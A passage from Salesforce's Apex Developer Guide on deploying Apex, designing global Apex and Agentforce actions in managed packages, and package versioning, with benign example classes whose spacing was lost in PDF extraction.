immediately following a deployment. You can’t disable the compile on deploy option in production orgs.
For developer sandbox, developer pro sandbox, partial copy sandbox, developer, trial, and scratch orgs, this feature is disabled by default.
To enable, select the Perform Synchronous Compile on Deploy option under Apex Settings in Setup. Deselect this option if you want
to disable the feature in full sandboxes.
With the Compile on Deploy feature, deployments to the org invoke the Apex compiler and save the resulting bytecode as part of the
deployment. For example, if you deploy a custom field, all the classes that use that custom field are recompiled. A minimal increase in
deployment times can occur, but Apex doesn’t need to be recompiled to process subsequent requests. The slight increase in deployment
time can, in fact, mitigate performance issues for currently active users or processes. Consider enabling this feature in sandboxes or
scratch orgs shared by multiple users for functional testing or used by continuous integration processes.
1.Deploy Apex Using Change Sets
Use change sets to deploy Apex classes and triggers between connected organizations, for example, from a sandbox org to your
production org.
2.Deploy Apex Using Salesforce Extensions for Visual Studio Code and Code Builder
Salesforce Extensions for VS Code and Code Builder are powered by Salesforce CLI and the Salesforce APIs.
739
Deploying ApexApex Developer Guide

3.Deploy Apex Using Metadata API
Use Metadata API to deploy customization information, such as custom object definitions for your org.
4.Deploy Apex Using Tooling API
Use Tooling API to deploy Apex classes or Apex triggers. Because Tooling API allows you to change just one element within a complex
type, it is easy to deploy using Tooling API.
5.Deploy Apex Using DevOps Center
Salesforce DevOps Center provides an improved experience around change and release management. Build a pipeline when you
configure DevOps Center and use the pipeline to promote work items through the release lifecycle from development to production.
Deploy Apex Using Change Sets
EDITIONS
Available in: Salesforce
Classic
Available in Enterprise,
Performance, Unlimited,
and Database.com Editions
Use change sets to deploy Apex classes and triggers between connected organizations, for example,
from a sandbox org to your production org.
You can create an outbound change set in the Salesforce user interface and add the Apex
components that you want to upload and deploy to the target organization.
SEE ALSO:
Sandboxes: Staging Environments for Customizing and Testing: Change Sets
Deploy Apex Using Salesforce Extensions for Visual Studio Code and Code Builder
Salesforce Extensions for VS Code and Code Builder are powered by Salesforce CLI and the Salesforce APIs.
Salesforce Extensions for Visual Studio Code support different deployment options based on your role and needs as a customer, system
integrator, or independent software vendor (ISV) partner. Salesforce DX supports Org Development and Package Development models
to authorize, create, and deploy code in your project. For information on how to deploy to a Salesforce org with Visual Studio Code, see
Salesforce Development Models.
Salesforce Code Builder is a web-based integrated development environment that has all the power and flexibility of Visual Studio Code
in your web browser. For information on how to connect an org to your Code Builder environment and deploy your code, see Code
Builder: Quick Start.
SEE ALSO:
Salesforce Extensions for Visual Studio Code: Deploy and Retrieve Code
Salesforce DX Developer Guide: Develop Against Any Org
Salesforce CLI Command Reference: project deploy start
Deploy Apex Using Metadata API
Use Metadata API to deploy customization information, such as custom object definitions for your org.
To deploy custom metadata, use the Metadata.Operations.enqueueDeployment() method to asynchronously deploy
metadata to the current org. For more information, see Operations Class.
740
Deploying ApexApex Developer Guide

Note:  If a single deployment has over 2,000 Apex classes, ApexCodeCoverage objects for the deployed classes are deleted even
if the deployment fails or is rolled back. ApexCodeCoverageAggregate objects aren’t affected.
SEE ALSO:
Metadata API Developer Guide: deploy()
Using Salesforce Features with Apex: Metadata
Deploy Apex Using Tooling API
Use Tooling API to deploy Apex classes or Apex triggers. Because Tooling API allows you to change just one element within a complex
type, it is easy to deploy using Tooling API.
Use ContainerAsyncRequest to compile and deploy the changes with ApexTriggerMember, ApexComponentMember, and
ApexPageMember.
SEE ALSO:
Tooling API: When to Use Tooling API
Deploy Apex Using DevOps Center
Salesforce DevOps Center provides an improved experience around change and release management. Build a pipeline when you
configure DevOps Center and use the pipeline to promote work items through the release lifecycle from development to production.
For information, see Manage and Release Changes Easily and Collaboratively with DevOps Center: Promote Work Items Through Your
Pipeline.
Distributing Apex Using Managed Packages
As an ISV or Salesforce partner, you can distribute Apex code to customer organizations using packages. Here we'll describe packages
and package versioning.
Important:  If a ConnectApi class has a dependency on Chatter, the code can be compiled and installed in orgs that don’t
have Chatter enabled. However, if Chatter isn’t enabled, the code throws an error at run time. See Packaging ConnectApi
Classes on page 454.
1.What is a Package?
2.Best Practices for Using Global Apex in Managed Packages
As an independent software vendor (ISV) developer, understand when and how to use global Apex in managed packages. Learn
design patterns that maximize flexibility and comply with the strict manageability rules applied to global Apex after your managed
package’s release. By following these best practices, you can improve the stability and maintainability of your API.
3.Design Managed Apex for Agentforce
As an independent software vendor (ISV) developer, you can build custom agent actions using Apex and distribute them in managed
packages. To ensure that subscriber admins can declaratively configure your Apex agent actions and that Agentforce can invoke
the actions at run time, follow these requirements and recommendations.
4.Package Versions
5.Deprecating Apex
741
Distributing Apex Using Managed PackagesApex Developer Guide

6.Behavior in Package Versions
What is a Package?
A package is a container for something as small as an individual component or as large as a set of related apps. After creating a package,
you can distribute it to other Salesforce users and organizations, including those outside your company. An organization can create a
single managed package that can be downloaded and installed by many different organizations. Managed packages differ from
unmanaged packages by having some locked components, allowing the managed package to be upgraded later. Unmanaged packages
do not include locked components and cannot be upgraded.
SEE ALSO:
ISVforce Guide
Second-Generation Managed Packaging Developer Guide: Components Available in Second-Generation Managed Packages–Apex
Class
Best Practices for Using Global Apex in Managed Packages
As an independent software vendor (ISV) developer, understand when and how to use global Apex in managed packages. Learn
design patterns that maximize flexibility and comply with the strict manageability rules applied to global Apex after your managed
package’s release. By following these best practices, you can improve the stability and maintainability of your API.
Important:  We recommend using the global access modifier only when necessary. The API shape of global Apex, such
as the name, parameters, and return type of global methods, is subject to strict manageability rules. You generally can’t change
the API shape of global Apex after it’s released in a managed package.
The global modifier on page 68 provides the widest level of access. It makes your Apex classes, methods, interfaces, and variables
accessible and callable from any Apex code outside of your package namespace, including code written by subscribers or other installed
packages.
A key benefit of Apex in managed packages is Intellectual Property (IP) protection. Although global Apex signatures, such as global
class and method names, parameters, and return types, are visible so subscribers can use your API, the underlying implementation logic
within your methods is encapsulated and hidden. This allows you to provide powerful functionality without exposing your proprietary
source code.
When to Use Global Apex in Managed Packages
Use global Apex when:
•
Exposing a global API. You intend for subscribers to use your package’s core services by directly calling your Apex methods or
instantiating your classes from their own Apex code, such as from their triggers, batch classes, or other custom logic.
•
Providing extensibility points. You’re designing global interfaces or globalabstract base classes that subscribers must
implement or extend to customize or enhance specific behaviors within your app.
•
Creating web service endpoints. You’re exposing Apex classes to handle incoming REST API requests or SOAP web service calls from
external systems. These endpoint classes and their methods must be declared global to receive calls from external systems.
Avoid global Apex for:
•
Internal package functionality, meaning any Apex code, such as business logic, helper classes, or utility methods, that’s designed
exclusively for use within your managed packages. For these internal components,  access modifiers on page 68 such as public,
protected, or private avoid the manageability constraints of global. You can even combine the public access modifier
with the @NamespaceAccessible annotation to allow access throughout your package namespace.
742
Distributing Apex Using Managed PackagesApex Developer Guide

•
Controller methods, or methods within your package that are called by your Lightning web components (LWC) and aren’t used by
your subscribers directly. Make these methods public and annotate them with @AuraEnabled on page 94.
•
Method signatures with external global types. Avoid using global Apex types from another managed package as parameters
or return types in your own global methods. This practice locks your package into a rigid dependency. If the other package later
changes or deprecates the types that your global signature relies on, it can become difficult or impossible for your package to
adopt newer versions of the dependency package.
Global Apex Manageability Rules
The decision to use global is significant because it subjects your code to strict manageability rules after your package is released.
Manageability rules protect subscribers against package upgrades that break existing functionality. These rules make your initial global
Apex design critical, as changes in later versions are heavily restricted.
After your managed package is released, these restrictions apply to the global Apex in the package.
•
You can’t delete a global class, interface, method, variable, or enum.
•
You can’t change the name of a global class, interface, method, variable, or enum.
•
You can’t change the access modifier of a global class, interface, method, variable, or enum from global to another access
modifier.
•
You can’t change a global method’s signature, including the order, number, and types of parameters, as well as the method’s
return type. You can add new methods that overload existing global methods.
•
You can’t change the value of a globalstaticfinal variable.
•
You can’t change the data type of a global variable to an incompatible one.
•
You can’t change most annotations or modifiers on global members. For example, you can’t add or remove the @AuraEnabled
annotation or any Apex REST annotation on page 326 from a global method. Similarly, you can’t add or remove the static
or final keyword from a global method.
•
You can’t remove a zero-argument constructor from a global class. This restriction applies both to explicitly deleting a constructor
you wrote, and to implicitly removing the default constructor by adding a new constructor that requires arguments.
•
You can’t remove a global interface from a global class.
•
You can’t extend a global interface with a new interface.
•
You can’t change a global class to an interface, or vice versa.
•
You can’t add abstract methods to global interfaces or abstract classes.
•
You can’t add final methods to globalvirtual or globalabstract classes.
•
You can’t remove or reorder global enum values, although you can add new enum values.
•
You can't add, remove or change that a global class extends another global class.
Given the strict manageability rules, a thoughtful design of your package’s global API is crucial. These best practices for defining and
managing global Apex promote flexibility, reduce maintenance, and help create a stable, evolvable API.
Only Use Global When Necessary
When designing global Apex, expose the fewest global members possible. Every global part of your package is a contract
with your subscribers. Fewer global members mean fewer restrictions and more freedom for you to update your package later.
Before making something global, consider these questions.
•
Is it truly necessary? Can you use public instead? For example, use public for access only by other Apex within the same
package, or public and @NamespaceAccessible for access only by other Apex in packages that have the same namespace.
•
Are there other designs? Can you achieve the same result without making methods or classes global?
743
Distributing Apex Using Managed PackagesApex Developer Guide

Delegate from Thin Global Entry Points
Make your global classes and methods act only as thin entry points. Place any business logic or complex processes in public
classes and methods within your package. The global method then calls these public methods.
Delegating logic to public classes and methods promotes:
•
Flexibility. You can freely add new features or completely change the internal public implementation of your service in future versions
without altering the global method signature.
•
Maintainability. Fixing bugs and refactoring your existing business logic is now safer and lower-risk because the work is decoupled
from the stable global API contract that your subscribers depend on.
•
Testability. Your public business logic classes can be unit tested thoroughly and independently of their global entry point.
Example: In this example, MyPackageApi.greetUsers is the stable global contract. The actual work happens in
createGreetings, which is public and can be easily modified in future package versions as long as the greetUsers
signature in MyPackageApi remains unchanged. For example, the ISV developer can later optimize createGreetings
or add new helper methods without violating global Apex manageability rules.
// --- ISV'sManagedPackageCode---
// GlobalEntryPoint
globalwithsharingclassMyPackageApi{
// Note:Thisis a simplifiedexampleusinga primitivedatatype.For a
// moreflexibleand future-proofdesign,we recommendusingparameter
// objectsfor globalmethodsignatures,as explainedin the nextsection.
globalstaticList<String> greetUsers(List<String> userNames){
// Delegatedirectlyto a publicclassto do the actualwork.
// GreetingServiceis a 'public'classwithinyourpackage.
GreetingServiceservice= new GreetingService();
returnservice.createGreetings(userNames);
}
}
// PublicClass(Livesinsideyourpackage)
// Thisclasscan be updatedeasilyin futurepackageversions.
publicwithsharingclassGreetingService{
// Thispublicmethodcontainsall the businesslogicto processa listof names.
publicList<String> createGreetings(List<String> names){
List<String> greetings= new List<String>();
// Inputvalidationand errorhandling,e.g.Returnan emptylistif inputis
nullor empty.
// Processeachnamein the list.
for (Stringname: names){
greetings.add('Hello,' + name+ '!');
}
returngreetings;
}
// If needed,you can freelyadd privatemethodshere
privatevoidsomeHelperMethod(){
// ...
}
}
744
Distributing Apex Using Managed PackagesApex Developer Guide

// --- SubscriberCode---
// Subscribercreatesa listand callsthe globalmethod
List<String> welcomeMessages= TheIsvNamespace.MyPackageApi.greetUsers(
new List<String>{'JaneDoe', 'RoseGonzalez'});
// The outputis a correspondinglistof greetings.
// welcomeMessageswillbe: ['Hello,JaneDoe!','Hello,RoseGonzalez!']
Use Parameter Objects for Global Method Inputs and Return Types
Using primitive data types, such as String or ID, directly in global method signatures creates a rigid contract that you can’t change.
To avoid this restriction, we recommend using custom global Apex classes as parameter objects for both inputs and outputs. This
pattern provides a stable API contract that’s evolvable, safer, and readable for subscribers.
Benefits of using parameter objects include:
•
Evolvability. You can add new parameters to your API by adding new properties to your input or output classes. The global
method signature itself never changes, which avoids breaking changes.
•
Safety and discoverability. Subscribers get compile-time safety and code completion while constructing the request object, which
reduces the risk of run-time errors from typos or incorrect data types.
•
Readability. Grouping related parameters into a dedicated class makes your method signature clean and its purpose clear. For
example, getCoordinates(Addresslocation) is easier for your subscribers to understand and use than
getCoordinates(Stringstreet,Stringcity,Stringstate,Stringzip,...).
Despite the benefits of using parameter objects, consider these costs.
•
Increased upfront complexity. This pattern requires more initial code, such as multiple classes, and can be excessive for simple actions
that aren’t expected to change.
•
Expanded global surface area. Although the primary method signature remains stable, each global property added to the input
object becomes a new, permanent part of your package’s API.
Example: In this example, the GeocodingService.getCoordinates method is the global contract. It uses the custom
globalAddressRequest class as its input, and the custom globalGeolocationResponse class as its output.
// --- ISV'sManagedPackageCode---
// The globalentrypointclasscontainsthe globalmethodand input& outputwrapper
innerclasses.
globalwithsharingclassGeocodingService{
// 1. The GlobalMethod
// The signatureis clean,usingthe innerclassesfor its inputparameterand
returntype.
globalstaticGeolocationResponsegetCoordinates(AddressRequestlocation){
// --- Internallogicto processthe request---
// We recommendcallinga publicmethodto delegateall businesslogic.Skipping
thisfor brevityin thisexample
// Thiscouldinvolvecalloutsto an externalgeocodingservice.
// For thisexample,we willreturnmockdata.
if (location.postalCode== '94105') {
returnnew GeolocationResponse(37.7749,-122.4194);
} else{
returnnew GeolocationResponse(0,0);
}
}
745
Distributing Apex Using Managed PackagesApex Developer Guide

// 2. The InputParameterObject(as an innerclass)
// A simpleinnerclasswithglobalpropertiesto bundleinputparameters.
globalwithsharingclassAddressRequest{
globalStringstreet;
globalStringcity;
globalStringstate;
globalStringpostalCode;
// A constructorhelpsensurerequiredfieldsare provided.
globalAddressRequest(Stringstreet,Stringcity,Stringstate,String
postalCode){
this.street= street;
this.city= city;
this.state= state;
this.postalCode= postalCode;
}
}
// 3. The OutputParameterObject(as an innerclass)
// A simpleinnerclassto providea structuredresult.
globalwithsharingclassGeolocationResponse{
// Using'privateset'makesthesepropertiesread-onlyfor subscribers.
// @AuraEnabledmakesthesepropertiesvisibleto Lightningweb components,
if necessary.
@AuraEnabledglobalDecimallatitude{ get;privateset;}
@AuraEnabledglobalDecimallongitude{ get;privateset;}
// Thisconstructoris public,not global,so subscriberscan'tcreatetheir
own responseobjects.
publicGeolocationResponse(Decimallat,Decimallon){
this.latitude= lat;
this.longitude= lon;
}
}
}
// --- SubscriberCode---
// The subscriber'sexperienceis cleanand type-safe.
// 1. Createan instanceof the inputobject,referencingit via the outerclass.
TheIsvNamespace.GeocodingService.AddressRequestsfAddress= new
TheIsvNamespace.GeocodingService.AddressRequest(
'415MissionSt',
'SanFrancisco',
'CA',
'94105'
);
// 2. Callthe globalmethodwiththe singleparameterobject.
TheIsvNamespace.GeocodingService.GeolocationResponsecoordinates=
TheIsvNamespace.GeocodingService.getCoordinates(sfAddress);
// 3. Processthe structured,strongly-typedresult.
// For thisexamplewe willjustlog the results.
746
Distributing Apex Using Managed PackagesApex Developer Guide

System.debug('Coordinatesfound:' + coordinates.latitude+ ', ' +
coordinates.longitude);
Alternative for Unpredictable Inputs: The Map Pattern
For scenarios where the inputs aren’t known at compile time, you can use a Map for your method’s input parameters. An example
signature with this pattern is globalstaticGeolocationResponse
processUnstructuredRequest(Map<String, Object> inputs).
Important:  Use this pattern with caution. This pattern isn’t recommended for return types.
Accepting a Map allows the subscriber to construct the Map and populate the keys and values themselves. Although this pattern provides
maximum flexibility, returning a Map forces the subscriber to guess key names and data types, which leads to fragile code.
Additionally, using a Map for inputs sacrifices compile-time safety and discoverability. Subscribers must rely entirely on documentation
to know the required keys and their data types. Simple typos in map keys can result in hard-to-debug run-time errors instead of
compile-time errors.
Note:  The standard Callable interface uses the Map pattern through its call(Stringaction,Map<String,
Object> args) method. However, this method returns a generic Object, which forces subscribers to cast the response and
risk run-time errors. It creates a single, generic entry point that can perform many different functions based on the action string.
For a single-purpose action that accepts unstructured inputs, a custom method such as processUnstructuredRequest
is clearer and safer.
Instead of using the Map pattern, prefer strongly-typed parameter objects as shown in the Use Parameter Objects for Global Method
Inputs and Return Types on page 745 section. Reserve the Map pattern for advanced use cases where the inputs are truly unpredictable
and its risks are acceptable, but always return a strongly-typed object.
Use Global Interfaces with Factory Methods
The facade pattern is effective if you want to define a capability and then provide one or more ways to use it. In this pattern, a global
interface defines the capability, and the public classes that implement the interface define how to use the capability. A global factory
method gives the subscriber the specific implementation of the interface.
Benefits of using the facade pattern include:
•
You can change the public class that does the work as long as it still follows the global interface rules.
•
You can offer new implementations of the interface later.
Example: In this example, Notifier is the global contract, and the public class EmailNotifierImpl does the
work. Because the factory class is global but the classes that implement the Notifier interface are public, the ISV
developer can later change or add to these classes. For example, if the ISV developer later wants to offer an SMS notifier, they can
add getSmsNotifier() to the factory class and implement a new publicSmsNotifierImpl class.
// --- ISV'sManagedPackageCode---
// GlobalInterface- Definesa capability
globalinterfaceNotifier{
globalvoidsend(Stringmessage);
}
// GlobalFactoryClass- Providesinstances
globalwithsharingclassNotificationFactory{
globalstaticNotifiergetEmailNotifier(){
returnnew EmailNotifierImpl();// EmailNotifierImplis public
747
Distributing Apex Using Managed PackagesApex Developer Guide

}
}
// PublicImplementation(Livesinsideyourpackage)
publicwithsharingclassEmailNotifierImplimplementsNotifier{
publicvoidsend(Stringmessage){
// Logicto sendan email(simplifiedhere)
System.debug('Emailing:' + message);
}
}
// --- SubscriberCode---
// Subscribergetsan instanceof a Notifier
NotifiermyEmailer= NotificationFactory.getEmailNotifier();
// Subscriberusesthe interfacemethod
myEmailer.send('Welcometo our service!'); // Outputs:Emailing:Welcometo our service!
Strategies for Retiring Global Apex
Even though deprecating Apex on page 754 only affects future versions of your package, phasing out a global Apex member requires
careful planning and clear communication to prevent subscriber disruption.
Here’s some recommendations for effectively retiring a global Apex member.
•
Communicate early and clearly. Inform subscribers well in advance—ideally, multiple release cycles—of any deprecation. Explain
reasons, timelines, and migration paths. Update the documentation, and share it prominently.
•
Provide alternatives. Release well-documented and robust alternatives before or concurrent with the deprecation announcement.
•
Implement soft deprecation with non-breaking warnings.
–
Add the @Deprecated annotation to the global member. This annotation generates compile-time warnings in developer
tools, but doesn’t alter run-time behavior.
–
Consider run-time logging when the deprecated member is invoked, guiding subscribers to the new alternative.
Note:  You can’t remove the @Deprecated annotation to undeprecate something in Apex after you’ve released a
package version where that item in Apex is deprecated. You also can’t add new global access modifiers to a
@Deprecated type.
•
Enforce non-operation with exceptions. Change the code to throw an informative exception, such as
FeatureDeprecatedException('MethodX is retired.Use MethodY.'). This breaking change at run
time stops the old logic from running and forces attention to the deprecation. However, any breaking change requires extensive
prior communication.
•
Retire code for obsolete global Apex. After ample time and communication, confirm that subscribers are no longer using the
deprecated global member. Then minimize the member’s internal code. Although the global signature must remain, its logic
can become non-operational (no-op), return a safe default, or throw a specific FeatureRetired exception. Implementing
these changes reduces the risk and effort of maintaining the old code.
748
Distributing Apex Using Managed PackagesApex Developer Guide

Always thoroughly test changes related to deprecating global Apex, including testing your package’s behavior if a subscriber attempts
to call the deprecated member. The goal is a graceful transition for your subscribers.
SEE ALSO:
Access Modifiers
Apex Class Definition
Exposing Apex Classes as REST Web Services
Exposing Apex Methods as SOAP Web Services
NamespaceAccessible Annotation
Deprecating Apex
Apex Reference Guide: Callable Interface
Second-Generation Managed Packaging Developer Guide: Components Available in Second-Generation Managed Packages–Apex
Class
Design Managed Apex for Agentforce
As an independent software vendor (ISV) developer, you can build custom agent actions using Apex and distribute them in managed
packages. To ensure that subscriber admins can declaratively configure your Apex agent actions and that Agentforce can invoke the
actions at run time, follow these requirements and recommendations.
Use Global Apex
For Agentforce to use Apex agent actions in managed packages, these Apex members must have the global access modifier on page
68.
•
The Apex class containing the @InvocableMethod on page 95 that defines the agent action.
•
The input wrapper class that defines the parameters an admin can configure for the action, and the output wrapper class that defines
the structured result returned to Agentforce.
•
All @InvocableVariable on page 100 members within these input and output wrapper classes.
•
Any custom Apex data types used as properties in your wrapper classes.
Important:  If any of these Apex members aren’t global, then the Apex agent action can’t be invoked by Agentforce at run
time.
These Apex members must be global because Agentforce agents currently can’t be packaged directly, and therefore can’t have a
namespace. By definition, this means that Apex agent actions don’t have access to non-global Apex, such as public Apex, that’s
part of a managed package and does have a namespace.
Importantly, managed global Apex is subject to stricter manageability rules than managed non-global Apex. See the Global Apex
Manageability Rules on page 743 section of Best Practices for Using Global Apex in Managed Packages on page 742.
Although global Apex is required for any direct entry point to an agent action, delegate any business logic or heavy lifting to public
classes and methods. See the Delegate from Thin Global Entry Points on page 744 section of Best Practices for Using Global Apex in
Managed Packages on page 742.
Use @InvocableMethod to Define the Action
To define an Apex agent action, use the @InvocableMethod on page 95 annotation and follow these requirements.
•
Your Apex method must be globalstatic.
749
Distributing Apex Using Managed PackagesApex Developer Guide

•
Your Apex method must be annotated with @InvocableMethod(label='YourActionName'
description='Clear,concisedescriptionof whatthe actiondoes' category='YourISV
App Name').
–
Use clear and descriptive label and description modifiers. The Agentforce reasoning engine uses them to determine
when to invoke the action. Subscriber admins configuring Agentforce also use them to help decide which agent topics to add
the action to.
–
Use the category modifier to help organize actions. We recommend using your ISV app name.
Note:  Only one method in a class can have the @InvocableMethod annotation. Create a separate global Apex class for
each agent action in your managed package.
Structure Inputs and Outputs with Global Wrapper Classes
In addition to the requirements of using global Apex and the @InvocableMethod annotation, we also recommend using
custom global classes to structure input and output parameters. By using parameter objects, you avoid changing the global
method signature when you modify the parameters of the agent action. To learn how to use this pattern, see the Use Parameter Objects
for Global Method Inputs and Return Types on page 745 section of Best Practices for Using Global Apex in Managed Packages on page
742. Then review these targeted guidelines to implement Apex agent actions using this pattern.
Because you can’t change managed global method signatures, make signatures flexible.
•
Define global inner Apex classes to serve as containers for input and output parameters. These classes can be in the same top-level
class as the invocable method.
•
Annotate both input and output classes with @JsonAccess(serializable='always'
deserializable='always'). The @JsonAccess annotation on page 109 governs the serialization and deserialization of
managed Apex. Because Agentforce serializes and deserializes complex Apex types from an unmanaged context at run time, both
@JsonAccess parameters must be set to 'always'.
•
Within these input and output classes, declare global member variables annotated with
@InvocableVariable(label='User-FriendlyName' description='Descriptionof this
parameter' required=true/false).
–
Use clear and descriptive label and description modifiers, so that subscribers can configure the inputs declaratively,
and Agentforce can understand the output.
–
Set the required modifier as true or false to specify whether the input is required for the agent action to run. This
modifier also helps subscriber admins configure your actions.
•
Define the invocable method to accept a List of its input class type, for example List<MyInputAction>requests.
•
Define the invocable method to return a List of its output class type, for example List<MyOutputAction>results.
Example Code for an Apex Agent Action
In this example, the getCoordinates method is defined as an @InvocableMethod so it can be invoked by Agentforce. The
method accepts a list of GeocodingRequest objects and returns a corresponding list of GeocodingResponse objects. The
input and output wrapper classes are both annotated with @JsonAccess(serializable='always'
deserializable='always') so Agentforce can serialize and deserialize the objects from an unmanaged context. The properties
of both wrapper classes are defined as @InvocableVariable so an admin can configure them declaratively. The label and
750
Distributing Apex Using Managed PackagesApex Developer Guide

description modifiers in both @InvocableMethod and @InvocableVariable are important because they help the
Agentforce reasoning engine to understand how to use the action.
// --- ISV'sManagedPackageCode---
// --- 1. The GlobalEntrypointClass---
// Thisclasscontainsthe @InvocableMethodand the input/outputwrapperclasses.
globalwithsharingclassGeocodingAction{
// Thismethodis the thin,globalentrypointthatdelegatesany businesslogicto a
separatepublicclass.
@InvocableMethod(
label='GetCoordinatesfor Address'
description='Retrievesthe latitudeand longitudefor a givenstreetaddress.'
category='My ISV App Name'
)
globalstaticList<GeocodingResponse>getCoordinates(List<GeocodingRequest>requests)
{
// Delegatethe entirelistto the internallogicclassto ensure
// any calloutsor DML can be performedin bulk.
GeocodingLogiclogic= new GeocodingLogic();
returnlogic.performGeocoding(requests);
}
// --- InputWrapperInnerClass---
// Definesthe parametersan admincan configurefor thisaction.
@JsonAccess(serializable='always'deserializable='always')
globalwithsharingclassGeocodingRequest{
@InvocableVariable(label='Street'required=true)
globalStringstreet;
@InvocableVariable(label='City'required=true)
globalStringcity;
@InvocableVariable(label='State/Province'required=true)
globalStringstate;
@InvocableVariable(label='PostalCode'required=true)
globalStringpostalCode;
}
// --- OutputWrapperInnerClass---
// Definesthe structuredresultreturnedto Agentforce.
@JsonAccess(serializable='always'deserializable='always')
globalwithsharingclassGeocodingResponse{
@InvocableVariable(label='WasSuccessful')
globalBooleanisSuccess;
@InvocableVariable(label='Latitude')
globalDecimallatitude;
@InvocableVariable(label='Longitude')
globalDecimallongitude;
@InvocableVariable(label='ErrorMessage')
globalStringerrorMessage;
751
Distributing Apex Using Managed PackagesApex Developer Guide

}
// Staticfactorymethodsfor creatingconsistentresults.
publicstaticGeocodingResponsesuccess(Decimallat,Decimallon){
GeocodingResponseresult= new GeocodingResponse();
result.isSuccess= true;
result.latitude= lat;
result.longitude= lon;
returnresult;
}
publicstaticGeocodingResponseerror(Stringmessage){
GeocodingResponseresult= new GeocodingResponse();
result.isSuccess= false;
result.errorMessage= message;
returnresult;
}
}
// --- 2. The InternalLogicClass(Public,not Global)---
// Thisis wherethe actualbusinesslogiclives.
// It'sseparatefromthe globalentrypointclassfor betterorganizationand testing.
publicwithsharingclassGeocodingLogic{
// Sincewe definedthe inputsand outputsas innerclasses,we use dot notationto
referencethem.
publicList<GeocodingAction.GeocodingResponse>
performGeocoding(List<GeocodingAction.GeocodingRequest>requests){
List<GeocodingAction.GeocodingResponse>results= new
List<GeocodingAction.GeocodingResponse>();
// Thismethodwouldcontainyourcomplex,bulkifiedbusinesslogic.
// For example,you can aggregateall requestsintoa singlecallout
// to an externalgeocodingservice.
// For thissimplifiedexample,we loopand returnmockresults.
for (GeocodingAction.GeocodingRequestreq : requests){
// In a realimplementation,you wouldperforma calloutand handleerrors.
if (req.postalCode== '94105') {
results.add(GeocodingAction.success(37.7749,-122.4194));
} else{
results.add(GeocodingAction.error('Addresscouldnot be found.'));
}
}
returnresults;
752
Distributing Apex Using Managed PackagesApex Developer Guide

}
}
SEE ALSO:
Best Practices for Using Global Apex in Managed Packages
Access Modifiers
InvocableMethod Annotation
InvocableVariable Annotation
Use the with sharing, without sharing, and inherited sharing Keywords
Enforce User Mode for Database Operations
Salesforce Developers Blog: Build Custom Agent Actions Using Apex
Package Versions
A package version is a number that identifies the set of components uploaded in a package. The version number has the format
majorNumber.minorNumber.patchNumber (for example, 2.1.3). The major and minor numbers increase to a chosen value
during every major release. The patchNumber is generated and updated only for a patch release.
Unmanaged packages aren’t upgradeable, so each package version is simply a set of components for distribution. A package version
has more significance for managed packages. Packages can exhibit different behavior for different versions. Publishers can use package
versions to evolve the components in their managed packages gracefully by releasing subsequent package versions without breaking
existing customer integrations using the package.
When an existing subscriber installs a new package version, there’s still only one instance of each component in the package, but the
components can emulate older versions. For example, a subscriber can use a managed package that contains an Apex class. If the
publisher decides to deprecate a method in the Apex class and release a new package version, the subscriber still sees only one instance
of the Apex class after installing the new version. However, this Apex class can still emulate the previous version for any code that
references the deprecated method in the older version.
Note the following when developing Apex in managed packages:
•
The code contained in an Apex class, trigger, or Visualforce component that’s part of a managed package is obfuscated and can’t
be viewed in an installing org. The only exceptions are methods declared as global. You can view global method signatures in an
installing org. In addition, License Management Org users with the View and Debug Managed Apex permission can view their
packages’ obfuscated Apex classes when logged in to subscriber orgs via the Subscriber Support Console.
•
Managed packages receive a unique namespace. This namespace is prepended to your class names, methods, variables, and so on,
which helps prevent duplicate names in the installer’s org.
•
In a single transaction, you can only reference 10 unique namespaces. For example, suppose that you have an object that executes
a class in a managed package when the object is updated. Then that class updates a second object, which in turn executes a different
class in a different package. Even though the first package didn’t access the second package directly, the access occurs in the same
transaction. It’s therefore included in the number of namespaces accessed in a single transaction.
•
Package developers can use the deprecated annotation to identify methods, classes, exceptions, enums, interfaces, and variables
that can no longer be referenced in subsequent releases of the managed package in which they reside. This is useful when you’re
refactoring code in managed packages as the requirements evolve.
•
You can write test methods that change the package version context to a different package version by using the system method
runAs.
•
You can’t add a method to a global interface or an abstract method to a global class after the interface or class has been uploaded
in a Managed - Released package version. If the class in the Managed - Released package is virtual, the method that you can add to
753
Distributing Apex Using Managed PackagesApex Developer Guide

it must also be virtual and must have an implementation. If the class in the Managed - Release package extends another class, the
existing classes contract can't be removed.
•
Apex code contained in an unmanaged package that explicitly references a namespace can’t be uploaded.
SEE ALSO:
Setting Package Versions for Apex Classes and Triggers
Behavior in Package Versions
Deprecating Apex
Package developers can use the deprecated annotation to identify methods, classes, exceptions, enums, interfaces, and variables
that can no longer be referenced in subsequent releases of the managed package in which they reside. This is useful when you’re
refactoring code in managed packages as the requirements evolve.After you upload another package version as Managed - Released,
new subscribers that install the latest package version can’t see the deprecated elements, while the elements continue to function for
existing subscribers and API integrations. A deprecated item, such as a method or a class, can still be referenced internally by the package
developer.
Note: You can’t use the deprecated annotation in Apex classes or triggers in unmanaged packages.
Package developers can use Managed - Beta package versions for evaluation and feedback with a pilot set of users in different Salesforce
organizations. If a developer deprecates an Apex identifier and then uploads a version of the package as Managed - Beta, subscribers
that install the package version still see the deprecated identifier in that package version. If the package developer then uploads a
Managed - Released package version, subscribers will no longer see the deprecated identifier in the package version after they install it.
SEE ALSO:
Best Practices for Using Global Apex in Managed Packages
Behavior in Package Versions
A package component can exhibit different behavior in different package versions. This behavior versioning allows you to add new
components to your package and refine your existing components, while still ensuring that your code continues to work seamlessly for
existing subscribers. If a package developer adds a new component to a package and uploads a new package version, the new component
is available to subscribers that install the new package version.
1.Versioning Apex Code Behavior
2.Apex Code Items that Are Not Versioned
3.Testing Behavior in Package Versions
Versioning Apex Code Behavior
Package developers can use conditional logic in Apex classes and triggers to exhibit different behavior for different versions. Conditional
logic lets the package developer support existing behavior in classes and triggers in previous package versions while evolving the code.
When subscribers install multiple versions of your package and write code that references Apex classes or triggers in your package, they
must select the version they’re referencing. Within the Apex code that is being referenced in your package, you can conditionally execute
different code paths based on the version setting of the calling Apex code that is making the reference. The package version setting of
the calling code can be determined within the package code by calling the System.requestVersion method. In this way,
package developers can determine the request context and specify different behavior for different versions of the package.
754
Distributing Apex Using Managed PackagesApex Developer Guide

The following sample uses the System.requestVersion method and instantiates the System.Version class to define
different behaviors in an Apex trigger for different package versions.
triggeroppValidationon Opportunity(beforeinsert, beforeupdate) {
for (Opportunityo : Trigger.new){
// Add a new validationto the package
// Appliesto versionsof the managedpackagegreaterthan1.0
if (System.requestVersion().compareTo(new Version(1,0))> 0) {
if (o.Probability>= 50 && o.Description== null) {
